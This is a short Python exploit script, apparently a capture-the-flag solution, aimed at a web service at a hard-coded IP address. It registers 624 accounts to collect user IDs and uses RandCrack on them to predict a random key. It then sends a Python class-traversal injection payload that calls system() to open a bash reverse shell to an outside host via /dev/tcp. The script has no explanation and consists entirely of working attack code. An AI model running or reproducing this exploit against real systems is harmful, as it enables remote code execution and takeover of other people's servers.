import random, time
import requests
import json
from randcrack import RandCrack


def random_cracker():
    rc = RandCrack()

    with open("output.txt", "r") as f:
        lines = f.readlines()
        for line in lines:
            rc.submit(int(line.replace("\n","")))

    return rc
    
def register():
    url = "http://49.232.42.74:31914/register"
    user_id_list = []
    for i in range(624):
        json_data = {"username": str(i), "password": "p"}
        resp = requests.post(url, json=json_data)
        user_id = (resp.json())['user_id']
        user_id_list.append(user_id)
        print(i)
    return user_id_list

def output(user_id_list):
    with open("output.txt", "w") as f:
        for user_id in user_id_list:
            f.write(user_id + "\n")
        
def attack():
    url = "http://49.232.42.74:31914/api"
    rc = random_cracker()
    for i in range(300):
        json_data = {"key": rc.predict_randrange(0, 4294967295), "payload": f"''.__class__.__mro__[1].__subclasses__()[{i}].__init__.__globals__['system']('bash -c \"bash -i >& /dev/tcp/121.40.46.63/2333 0>&1\"')"}
        resp = requests.post(url, json=json_data)
        print(i)
        print(resp.text)

user_id_list = register()
output(user_id_list)
attack()
